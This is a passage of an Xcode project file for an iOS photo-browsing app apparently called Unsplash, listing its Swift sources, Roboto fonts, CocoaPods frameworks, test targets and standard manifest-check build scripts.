// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		22834BBD2629D8EC00090032 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22834BBC2629D8EC00090032 /* AppDelegate.swift */; };
		22834BC42629D8EC00090032 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22834BC22629D8EC00090032 /* Main.storyboard */; };
		22834BC62629D8EE00090032 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 22834BC52629D8EE00090032 /* Assets.xcassets */; };
		22834BC92629D8EE00090032 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 22834BC72629D8EE00090032 /* LaunchScreen.storyboard */; };
		22834BD42629D8EF00090032 /* UnsplashTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22834BD32629D8EF00090032 /* UnsplashTests.swift */; };
		22834BDF2629D8EF00090032 /* UnsplashUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 22834BDE2629D8EF00090032 /* UnsplashUITests.swift */; };
		22834C272629E31E00090032 /* Roboto-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 22834C1A2629E31E00090032 /* Roboto-Medium.ttf */; };
		22834C282629E31E00090032 /* Roboto-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 22834C1B2629E31E00090032 /* Roboto-Light.ttf */; };
		22834C292629E31E00090032 /* Roboto-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 22834C1C2629E31E00090032 /* Roboto-Regular.ttf */; };
		22834C2A2629E31E00090032 /* Roboto-MediumItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 22834C1D2629E31E00090032 /* Roboto-MediumItalic.ttf */; };
		22834C2B2629E31E00090032 /* Roboto-ThinItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 22834C1E2629E31E00090032 /* Roboto-ThinItalic.ttf */; };
		22834C2C2629E31E00090032 /* Roboto-BoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 22834C1F2629E31E00090032 /* Roboto-BoldItalic.ttf */; };
		22834C2D2629E31E00090032 /* Roboto-LightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 22834C202629E31E00090032 /* Roboto-LightItalic.ttf */; };
		22834C2E2629E31E00090032 /* Roboto-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 22834C212629E31E00090032 /* Roboto-Italic.ttf */; };
		22834C2F2629E31E00090032 /* LICENSE.txt in Resources */ = {isa = PBXBuildFile; fileRef = 22834C222629E31E00090032 /* LICENSE.txt */; };
		22834C302629E31E00090032 /* Roboto-BlackItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 22834C232629E31E00090032 /* Roboto-BlackItalic.ttf */; };
		22834C312629E31E00090032 /* Roboto-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 22834C242629E31E00090032 /* Roboto-Bold.ttf */; };
		22834C322629E31E00090032 /* Roboto-Thin.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 22834C252629E31E00090032 /* Roboto-Thin.ttf */; };
		22834C332629E31E00090032 /* Roboto-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 22834C262629E31E00090032 /* Roboto-Black.ttf */; };
		6411E2942910454D8F8748B7 /* Pods_UnsplashTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 91BE85EEF9E82AE178133042 /* Pods_UnsplashTests.framework */; };
		8577E0D1E75FBA98428FC9A6 /* Pods_Unsplash_UnsplashUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 3B4188E4D248DB04FEF30080 /* Pods_Unsplash_UnsplashUITests.framework */; };
		886733337CA1AB12CC74F609 /* Pods_Unsplash.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8A1FA148823F9DAF398BDE91 /* Pods_Unsplash.framework */; };
		DC92970B2629E6BA00EC7ED8 /* Service.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC92970A2629E6BA00EC7ED8 /* Service.swift */; };
		DC9297352629F56200EC7ED8 /* Photos.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC9297342629F56200EC7ED8 /* Photos.swift */; };
		DC92973D2629F5A000EC7ED8 /* PhotoListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC92973C2629F5A000EC7ED8 /* PhotoListViewModel.swift */; };
		DC9297452629F5B400EC7ED8 /* PhotoListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC9297442629F5B400EC7ED8 /* PhotoListVC.swift */; };
		DC929795262B529C00EC7ED8 /* PhotoCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC929793262B529C00EC7ED8 /* PhotoCell.swift */; };
		DC929796262B529C00EC7ED8 /* PhotoCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = DC929794262B529C00EC7ED8 /* PhotoCell.xib */; };
		DC92979B262B53FC00EC7ED8 /* AppEnum.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC92979A262B53FC00EC7ED8 /* AppEnum.swift */; };
		DC9297A1262B586800EC7ED8 /* Utility.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC9297A0262B586800EC7ED8 /* Utility.swift */; };
		DC9297A6262B5C8F00EC7ED8 /* Binding.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC9297A5262B5C8F00EC7ED8 /* Binding.swift */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		22834BD02629D8EF00090032 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 22834BB12629D8EC00090032 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 22834BB82629D8EC00090032;
			remoteInfo = Unsplash;
		};
		22834BDB2629D8EF00090032 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 22834BB12629D8EC00090032 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 22834BB82629D8EC00090032;
			remoteInfo = Unsplash;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		22834BB92629D8EC00090032 /* Unsplash.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Unsplash.app; sourceTree = BUILT_PRODUCTS_DIR; };
		22834BBC2629D8EC00090032 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		22834BC32629D8EC00090032 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		22834BC52629D8EE00090032 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		22834BC82629D8EE00090032 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		22834BCA2629D8EE00090032 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		22834BCF2629D8EF00090032 /* UnsplashTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = UnsplashTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		22834BD32629D8EF00090032 /* UnsplashTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnsplashTests.swift; sourceTree = "<group>"; };
		22834BD52629D8EF00090032 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		22834BDA2629D8EF00090032 /* UnsplashUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = UnsplashUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		22834BDE2629D8EF00090032 /* UnsplashUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnsplashUITests.swift; sourceTree = "<group>"; };
		22834BE02629D8EF00090032 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		22834C1A2629E31E00090032 /* Roboto-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Medium.ttf"; sourceTree = "<group>"; };
		22834C1B2629E31E00090032 /* Roboto-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Light.ttf"; sourceTree = "<group>"; };
		22834C1C2629E31E00090032 /* Roboto-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Regular.ttf"; sourceTree = "<group>"; };
		22834C1D2629E31E00090032 /* Roboto-MediumItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-MediumItalic.ttf"; sourceTree = "<group>"; };
		22834C1E2629E31E00090032 /* Roboto-ThinItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-ThinItalic.ttf"; sourceTree = "<group>"; };
		22834C1F2629E31E00090032 /* Roboto-BoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-BoldItalic.ttf"; sourceTree = "<group>"; };
		22834C202629E31E00090032 /* Roboto-LightItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-LightItalic.ttf"; sourceTree = "<group>"; };
		22834C212629E31E00090032 /* Roboto-Italic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Italic.ttf"; sourceTree = "<group>"; };
		22834C222629E31E00090032 /* LICENSE.txt */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = LICENSE.txt; sourceTree = "<group>"; };
		22834C232629E31E00090032 /* Roboto-BlackItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-BlackItalic.ttf"; sourceTree = "<group>"; };
		22834C242629E31E00090032 /* Roboto-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Bold.ttf"; sourceTree = "<group>"; };
		22834C252629E31E00090032 /* Roboto-Thin.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Thin.ttf"; sourceTree = "<group>"; };
		22834C262629E31E00090032 /* Roboto-Black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Roboto-Black.ttf"; sourceTree = "<group>"; };
		3B4188E4D248DB04FEF30080 /* Pods_Unsplash_UnsplashUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Unsplash_UnsplashUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		8A1FA148823F9DAF398BDE91 /* Pods_Unsplash.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Unsplash.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		91BE85EEF9E82AE178133042 /* Pods_UnsplashTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_UnsplashTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		973408536F106F9AF925FA4D /* Pods-Unsplash-UnsplashUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unsplash-UnsplashUITests.release.xcconfig"; path = "Target Support Files/Pods-Unsplash-UnsplashUITests/Pods-Unsplash-UnsplashUITests.release.xcconfig"; sourceTree = "<group>"; };
		B1D445B83CF9C6093C9CA8C0 /* Pods-UnsplashTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-UnsplashTests.release.xcconfig"; path = "Target Support Files/Pods-UnsplashTests/Pods-UnsplashTests.release.xcconfig"; sourceTree = "<group>"; };
		B2832C7CE423F27F480478FC /* Pods-UnsplashTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-UnsplashTests.debug.xcconfig"; path = "Target Support Files/Pods-UnsplashTests/Pods-UnsplashTests.debug.xcconfig"; sourceTree = "<group>"; };
		CC0FAA96B497279780422E15 /* Pods-Unsplash.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unsplash.debug.xcconfig"; path = "Target Support Files/Pods-Unsplash/Pods-Unsplash.debug.xcconfig"; sourceTree = "<group>"; };
		D0BD1F1C7A470603233031D3 /* Pods-Unsplash.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unsplash.release.xcconfig"; path = "Target Support Files/Pods-Unsplash/Pods-Unsplash.release.xcconfig"; sourceTree = "<group>"; };
		DC92970A2629E6BA00EC7ED8 /* Service.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Service.swift; sourceTree = "<group>"; };
		DC9297342629F56200EC7ED8 /* Photos.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Photos.swift; sourceTree = "<group>"; };
		DC92973C2629F5A000EC7ED8 /* PhotoListViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PhotoListViewModel.swift; sourceTree = "<group>"; };
		DC9297442629F5B400EC7ED8 /* PhotoListVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PhotoListVC.swift; sourceTree = "<group>"; };
		DC929793262B529C00EC7ED8 /* PhotoCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoCell.swift; sourceTree = "<group>"; };
		DC929794262B529C00EC7ED8 /* PhotoCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PhotoCell.xib; sourceTree = "<group>"; };
		DC92979A262B53FC00EC7ED8 /* AppEnum.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppEnum.swift; sourceTree = "<group>"; };
		DC9297A0262B586800EC7ED8 /* Utility.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Utility.swift; sourceTree = "<group>"; };
		DC9297A5262B5C8F00EC7ED8 /* Binding.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Binding.swift; sourceTree = "<group>"; };
		EEF34327CA584C6903DD451F /* Pods-Unsplash-UnsplashUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unsplash-UnsplashUITests.debug.xcconfig"; path = "Target Support Files/Pods-Unsplash-UnsplashUITests/Pods-Unsplash-UnsplashUITests.debug.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		22834BB62629D8EC00090032 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				886733337CA1AB12CC74F609 /* Pods_Unsplash.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22834BCC2629D8EF00090032 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				6411E2942910454D8F8748B7 /* Pods_UnsplashTests.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22834BD72629D8EF00090032 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8577E0D1E75FBA98428FC9A6 /* Pods_Unsplash_UnsplashUITests.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		15A48318764377CADF2B83FA /* Pods */ = {
			isa = PBXGroup;
			children = (
				CC0FAA96B497279780422E15 /* Pods-Unsplash.debug.xcconfig */,
				D0BD1F1C7A470603233031D3 /* Pods-Unsplash.release.xcconfig */,
				EEF34327CA584C6903DD451F /* Pods-Unsplash-UnsplashUITests.debug.xcconfig */,
				973408536F106F9AF925FA4D /* Pods-Unsplash-UnsplashUITests.release.xcconfig */,
				B2832C7CE423F27F480478FC /* Pods-UnsplashTests.debug.xcconfig */,
				B1D445B83CF9C6093C9CA8C0 /* Pods-UnsplashTests.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		22834BB02629D8EC00090032 = {
			isa = PBXGroup;
			children = (
				22834BBB2629D8EC00090032 /* Unsplash */,
				22834BD22629D8EF00090032 /* UnsplashTests */,
				22834BDD2629D8EF00090032 /* UnsplashUITests */,
				22834BBA2629D8EC00090032 /* Products */,
				15A48318764377CADF2B83FA /* Pods */,
				9DCB7E1E36B60CD997B3C275 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		22834BBA2629D8EC00090032 /* Products */ = {
			isa = PBXGroup;
			children = (
				22834BB92629D8EC00090032 /* Unsplash.app */,
				22834BCF2629D8EF00090032 /* UnsplashTests.xctest */,
				22834BDA2629D8EF00090032 /* UnsplashUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		22834BBB2629D8EC00090032 /* Unsplash */ = {
			isa = PBXGroup;
			children = (
				DC9297092629E69F00EC7ED8 /* ProjectHelper */,
				22834C182629E30300090032 /* AppFont */,
				22834C142629E1B500090032 /* Resources */,
				22834C132629E19600090032 /* Storyboard */,
				22834C0B2629DFFD00090032 /* View */,
				22834C0C2629E00300090032 /* ViewModel */,
				22834C0A2629DFF700090032 /* Model */,
				22834BBC2629D8EC00090032 /* AppDelegate.swift */,
				22834BCA2629D8EE00090032 /* Info.plist */,
			);
			path = Unsplash;
			sourceTree = "<group>";
		};
		22834BD22629D8EF00090032 /* UnsplashTests */ = {
			isa = PBXGroup;
			children = (
				22834BD32629D8EF00090032 /* UnsplashTests.swift */,
				22834BD52629D8EF00090032 /* Info.plist */,
			);
			path = UnsplashTests;
			sourceTree = "<group>";
		};
		22834BDD2629D8EF00090032 /* UnsplashUITests */ = {
			isa = PBXGroup;
			children = (
				22834BDE2629D8EF00090032 /* UnsplashUITests.swift */,
				22834BE02629D8EF00090032 /* Info.plist */,
			);
			path = UnsplashUITests;
			sourceTree = "<group>";
		};
		22834C0A2629DFF700090032 /* Model */ = {
			isa = PBXGroup;
			children = (
				DC9297342629F56200EC7ED8 /* Photos.swift */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		22834C0B2629DFFD00090032 /* View */ = {
			isa = PBXGroup;
			children = (
				DC92978F262B526A00EC7ED8 /* Xib's */,
				DC9297442629F5B400EC7ED8 /* PhotoListVC.swift */,
			);
			path = View;
			sourceTree = "<group>";
		};
		22834C0C2629E00300090032 /* ViewModel */ = {
			isa = PBXGroup;
			children = (
				DC92973C2629F5A000EC7ED8 /* PhotoListViewModel.swift */,
			);
			path = ViewModel;
			sourceTree = "<group>";
		};
		22834C132629E19600090032 /* Storyboard */ = {
			isa = PBXGroup;
			children = (
				22834BC22629D8EC00090032 /* Main.storyboard */,
			);
			path = Storyboard;
			sourceTree = "<group>";
		};
		22834C142629E1B500090032 /* Resources */ = {
			isa = PBXGroup;
			children = (
				22834BC52629D8EE00090032 /* Assets.xcassets */,
				22834BC72629D8EE00090032 /* LaunchScreen.storyboard */,
			);
			path = Resources;
			sourceTree = "<group>";
		};
		22834C182629E30300090032 /* AppFont */ = {
			isa = PBXGroup;
			children = (
				22834C192629E31E00090032 /* Roboto */,
			);
			path = AppFont;
			sourceTree = "<group>";
		};
		22834C192629E31E00090032 /* Roboto */ = {
			isa = PBXGroup;
			children = (
				22834C1A2629E31E00090032 /* Roboto-Medium.ttf */,
				22834C1B2629E31E00090032 /* Roboto-Light.ttf */,
				22834C1C2629E31E00090032 /* Roboto-Regular.ttf */,
				22834C1D2629E31E00090032 /* Roboto-MediumItalic.ttf */,
				22834C1E2629E31E00090032 /* Roboto-ThinItalic.ttf */,
				22834C1F2629E31E00090032 /* Roboto-BoldItalic.ttf */,
				22834C202629E31E00090032 /* Roboto-LightItalic.ttf */,
				22834C212629E31E00090032 /* Roboto-Italic.ttf */,
				22834C222629E31E00090032 /* LICENSE.txt */,
				22834C232629E31E00090032 /* Roboto-BlackItalic.ttf */,
				22834C242629E31E00090032 /* Roboto-Bold.ttf */,
				22834C252629E31E00090032 /* Roboto-Thin.ttf */,
				22834C262629E31E00090032 /* Roboto-Black.ttf */,
			);
			path = Roboto;
			sourceTree = "<group>";
		};
		9DCB7E1E36B60CD997B3C275 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				8A1FA148823F9DAF398BDE91 /* Pods_Unsplash.framework */,
				3B4188E4D248DB04FEF30080 /* Pods_Unsplash_UnsplashUITests.framework */,
				91BE85EEF9E82AE178133042 /* Pods_UnsplashTests.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		DC9297092629E69F00EC7ED8 /* ProjectHelper */ = {
			isa = PBXGroup;
			children = (
				DC92970A2629E6BA00EC7ED8 /* Service.swift */,
				DC92979A262B53FC00EC7ED8 /* AppEnum.swift */,
				DC9297A0262B586800EC7ED8 /* Utility.swift */,
				DC9297A5262B5C8F00EC7ED8 /* Binding.swift */,
			);
			path = ProjectHelper;
			sourceTree = "<group>";
		};
		DC92978F262B526A00EC7ED8 /* Xib's */ = {
			isa = PBXGroup;
			children = (
				DC929793262B529C00EC7ED8 /* PhotoCell.swift */,
				DC929794262B529C00EC7ED8 /* PhotoCell.xib */,
			);
			path = "Xib's";
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		22834BB82629D8EC00090032 /* Unsplash */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 22834BE32629D8EF00090032 /* Build configuration list for PBXNativeTarget "Unsplash" */;
			buildPhases = (
				858E9ACA39C79BFC2AAAC43A /* [CP] Build Pods Frameworks */,
				EE683595FE6ACD3B259029CB /* [CP] Check Pods Manifest.lock */,
				22834BB52629D8EC00090032 /* Sources */,
				22834BB62629D8EC00090032 /* Frameworks */,
				22834BB72629D8EC00090032 /* Resources */,
				EE35E1EB0CE402ADD62E8F6C /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = Unsplash;
			productName = Unsplash;
			productReference = 22834BB92629D8EC00090032 /* Unsplash.app */;
			productType = "com.apple.product-type.application";
		};
		22834BCE2629D8EF00090032 /* UnsplashTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 22834BE62629D8EF00090032 /* Build configuration list for PBXNativeTarget "UnsplashTests" */;
			buildPhases = (
				1845F5CA762442C1213F8B29 /* [CP] Check Pods Manifest.lock */,
				22834BCB2629D8EF00090032 /* Sources */,
				22834BCC2629D8EF00090032 /* Frameworks */,
				22834BCD2629D8EF00090032 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				22834BD12629D8EF00090032 /* PBXTargetDependency */,
			);
			name = UnsplashTests;
			productName = UnsplashTests;
			productReference = 22834BCF2629D8EF00090032 /* UnsplashTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		22834BD92629D8EF00090032 /* UnsplashUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 22834BE92629D8EF00090032 /* Build configuration list for PBXNativeTarget "UnsplashUITests" */;
			buildPhases = (
				3BF65278DE57BCBAEFA76176 /* [CP] Check Pods Manifest.lock */,
				22834BD62629D8EF00090032 /* Sources */,
				22834BD72629D8EF00090032 /* Frameworks */,
				22834BD82629D8EF00090032 /* Resources */,
				55EF734378A5FF537F61605A /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
				22834BDC2629D8EF00090032 /* PBXTargetDependency */,
			);
			name = UnsplashUITests;
			productName = UnsplashUITests;
			productReference = 22834BDA2629D8EF00090032 /* UnsplashUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		22834BB12629D8EC00090032 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1230;
				LastUpgradeCheck = 1230;
				TargetAttributes = {
					22834BB82629D8EC00090032 = {
						CreatedOnToolsVersion = 12.3;
					};
					22834BCE2629D8EF00090032 = {
						CreatedOnToolsVersion = 12.3;
						TestTargetID = 22834BB82629D8EC00090032;
					};
					22834BD92629D8EF00090032 = {
						CreatedOnToolsVersion = 12.3;
						TestTargetID = 22834BB82629D8EC00090032;
					};
				};
			};
			buildConfigurationList = 22834BB42629D8EC00090032 /* Build configuration list for PBXProject "Unsplash" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 22834BB02629D8EC00090032;
			productRefGroup = 22834BBA2629D8EC00090032 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				22834BB82629D8EC00090032 /* Unsplash */,
				22834BCE2629D8EF00090032 /* UnsplashTests */,
				22834BD92629D8EF00090032 /* UnsplashUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		22834BB72629D8EC00090032 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22834C312629E31E00090032 /* Roboto-Bold.ttf in Resources */,
				22834C2F2629E31E00090032 /* LICENSE.txt in Resources */,
				22834C2C2629E31E00090032 /* Roboto-BoldItalic.ttf in Resources */,
				22834C292629E31E00090032 /* Roboto-Regular.ttf in Resources */,
				DC929796262B529C00EC7ED8 /* PhotoCell.xib in Resources */,
				22834C2D2629E31E00090032 /* Roboto-LightItalic.ttf in Resources */,
				22834C272629E31E00090032 /* Roboto-Medium.ttf in Resources */,
				22834BC92629D8EE00090032 /* LaunchScreen.storyboard in Resources */,
				22834C302629E31E00090032 /* Roboto-BlackItalic.ttf in Resources */,
				22834C322629E31E00090032 /* Roboto-Thin.ttf in Resources */,
				22834C282629E31E00090032 /* Roboto-Light.ttf in Resources */,
				22834C2B2629E31E00090032 /* Roboto-ThinItalic.ttf in Resources */,
				22834C332629E31E00090032 /* Roboto-Black.ttf in Resources */,
				22834C2A2629E31E00090032 /* Roboto-MediumItalic.ttf in Resources */,
				22834BC62629D8EE00090032 /* Assets.xcassets in Resources */,
				22834C2E2629E31E00090032 /* Roboto-Italic.ttf in Resources */,
				22834BC42629D8EC00090032 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22834BCD2629D8EF00090032 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22834BD82629D8EF00090032 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		1845F5CA762442C1213F8B29 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-UnsplashTests-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		3BF65278DE57BCBAEFA76176 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Unsplash-UnsplashUITests-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		55EF734378A5FF537F61605A /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Unsplash-UnsplashUITests/Pods-Unsplash-UnsplashUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Unsplash-UnsplashUITests/Pods-Unsplash-UnsplashUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
